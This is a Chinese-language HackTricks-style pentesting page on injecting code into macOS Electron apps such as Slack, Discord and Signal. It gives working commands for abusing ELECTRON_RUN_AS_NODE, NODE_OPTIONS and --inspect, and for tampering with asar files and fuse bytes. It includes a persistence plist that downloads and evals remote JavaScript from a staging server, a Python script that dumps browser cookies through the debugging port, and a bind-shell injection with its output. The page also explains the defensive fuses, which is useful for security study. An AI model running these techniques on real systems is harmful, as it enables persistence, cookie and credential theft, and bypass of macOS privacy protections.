# macOS Electron 应用程序注入

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS 红队专家）</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

- 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
- 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品
- **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上关注我们**。
- 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

如果您不知道 Electron 是什么，您可以在[**这里找到大量信息**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。但现在只需知道 Electron 运行 **node**。\
而 node 具有一些可用于**使其执行其他代码**的**参数**和**环境变量**。

### Electron 保险丝

接下来将讨论这些技术，但近年来 Electron 已添加了几个**安全标志以防止它们**。这些是[**Electron 保险丝**](https://www.electronjs.org/docs/latest/tutorial/fuses)，这些是用于**防止** macOS 中的 Electron 应用程序**加载任意代码**的标志：

- **`RunAsNode`**：如果禁用，将阻止使用环境变量 **`ELECTRON_RUN_AS_NODE`** 注入代码。
- **`EnableNodeCliInspectArguments`**：如果禁用，参数如 `--inspect`、`--inspect-brk` 将不被尊重。避免以此方式注入代码。
- **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，macOS 将验证加载的 **`asar`** **文件**。通过这种方式**防止**通过修改此文件的内容进行**代码注入**。
- **`OnlyLoadAppFromAsar`**：如果启用，将仅检查和使用 app.asar，而不是按照以下顺序搜索加载：**`app.asar`**、**`app`**，最后是**`default_app.asar`**。因此，当与 **`embeddedAsarIntegrityValidation`** 保险丝结合使用时，**不可能**加载未经验证的代码。
- **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程将使用名为 `browser_v8_context_snapshot.bin` 的文件作为其 V8 快照。

另一个不会阻止代码注入的有趣保险丝是：

- **EnableCookieEncryption**：如果启用，磁盘上的 cookie 存储将使用操作系统级加密密钥进行加密。

### 检查 Electron 保险丝

您可以从应用程序中**检查这些标志**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### 修改 Electron 保险丝

正如[**文档提到的**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron 保险丝**的配置是在**Electron 二进制文件**中配置的，其中包含字符串**`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**。

在 macOS 应用程序中，这通常位于 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
您可以在 [https://hexed.it/](https://hexed.it/) 中加载此文件并搜索前述字符串。在此字符串之后，您可以在 ASCII 中看到一个数字 "0" 或 "1"，表示每个保险丝是禁用还是启用。只需修改十六进制代码（`0x30` 是 `0`，`0x31` 是 `1`）以**修改保险丝值**。

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

请注意，如果您尝试**覆盖**应用程序中的**`Electron Framework` 二进制文件**，带有这些修改字节的应用程序将无法运行。

## RCE 添加代码到 Electron 应用程序

可能存在**外部 JS/HTML 文件**，一个 Electron 应用程序正在使用，因此攻击者可以在这些文件中注入代码，其签名不会被检查，并在应用程序的上下文中执行任意代码。

{% hint style="danger" %}
然而，目前存在两个限制：

* 需要**`kTCCServiceSystemPolicyAppBundles`** 权限来修改应用程序，因此默认情况下不再可能。
* 编译的 **`asap`** 文件通常启用了保险丝 **`embeddedAsarIntegrityValidation`** 和 **`onlyLoadAppFromAsar`**

使得这种攻击路径变得更加复杂（或不可能）。
{% endhint %}

请注意，可以通过将应用程序复制到另一个目录（如 **`/tmp`**），将文件夹 **`app.app/Contents`** 重命名为 **`app.app/NotCon`**，**修改**带有您的**恶意**代码的 **asar** 文件，将其重新命名为 **`app.app/Contents`** 并执行它来绕过**`kTCCServiceSystemPolicyAppBundles`**的要求。

您可以使用以下命令从 asar 文件中解压缩代码：
```bash
npx asar extract app.asar app-decomp
```
并在修改后重新打包：
```bash
npx asar pack app-decomp app-new.asar
```
## 使用 `ELECTRON_RUN_AS_NODE` 进行 RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)，如果设置了这个环境变量，它将以普通的 Node.js 进程启动该进程。
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
如果禁用了fuse **`RunAsNode`**，环境变量 **`ELECTRON_RUN_AS_NODE`** 将被忽略，这将无法工作。
{% endhint %}

### 从应用程序 Plist 进行注入

正如[**在这里提出的**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，您可以滥用这个环境变量在 plist 中保持持久性：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## 使用 `NODE_OPTIONS` 进行 RCE

您可以将恶意载荷存储在不同的文件中并执行它：

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
如果 **`EnableNodeOptionsEnvironmentVariable`** 保持 **禁用**，应用程序在启动时将 **忽略** 环境变量 **NODE\_OPTIONS**，除非设置了环境变量 **`ELECTRON_RUN_AS_NODE`**，如果 **`RunAsNode`** 保持禁用，那么设置了 **`ELECTRON_RUN_AS_NODE`** 也将被 **忽略**。

如果不设置 **`ELECTRON_RUN_AS_NODE`**，你将会遇到这个 **错误**：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### 从应用程序 Plist 注入

您可以在 plist 中滥用这个环境变量以保持持久性，添加以下键：
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 利用检查进行RCE

根据[**这里**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果你使用诸如**`--inspect`**、**`--inspect-brk`**和**`--remote-debugging-port`**等标志来执行Electron应用程序，将会打开一个**调试端口**，这样你就可以连接到它（例如从Chrome中的`chrome://inspect`），然后你就可以**在其中注入代码**甚至启动新进程。\
例如：
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
如果禁用了熔丝 **`EnableNodeCliInspectArguments`**，应用程序在启动时将**忽略节点参数**（如 `--inspect`），除非设置了环境变量 **`ELECTRON_RUN_AS_NODE`**，如果禁用了熔丝 **`RunAsNode`**，则设置的环境变量也将**被忽略**。

然而，您仍然可以使用 **electron 参数 `--remote-debugging-port=9229`**，但之前的有效载荷将无法执行其他进程。
{% endhint %}

使用参数 **`--remote-debugging-port=9222`** 可以从 Electron 应用程序中窃取一些信息，如**历史记录**（使用 GET 命令）或浏览器中的**cookies**（因为它们在浏览器内部**解密**，并且有一个**json端点**可以提供它们）。

您可以在[**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)和[**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)了解如何操作，并使用自动工具 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 或类似的简单脚本：
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
在[**这篇博文**](https://hackerone.com/reports/1274695)中，利用这种调试方法使一个无头chrome**在任意位置下载任意文件**。

### 从应用程序 Plist 进行注入

您可以滥用这个环境变量在一个 plist 中，以保持持久性添加这些键：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 滥用旧版本的 TCC Bypass

{% hint style="success" %}
macOS 的 TCC 守护程序不会检查应用程序的执行版本。因此，如果您无法使用任何先前的技术在 Electron 应用程序中注入代码，您可以下载应用程序的旧版本并在其中注入代码，因为它仍将获得 TCC 权限（除非信任缓存阻止）。
{% endhint %}

## 运行非 JS 代码

先前的技术将允许您在 Electron 应用程序的进程中运行 JS 代码。但是，请记住，**子进程在相同的沙盒配置文件下运行**，并**继承其 TCC 权限**。\
因此，如果您想滥用权限以访问摄像头或麦克风，您可以**从进程中运行另一个二进制文件**。

## 自动注入

工具 [**electroniz3r**](https://github.com/r3ggi/electroniz3r) 可轻松用于**查找已安装的易受攻击的 Electron 应用程序**并在其中注入代码。此工具将尝试使用**`--inspect`**技术：

您需要自行编译它，并可以像这样使用它：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考资料

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
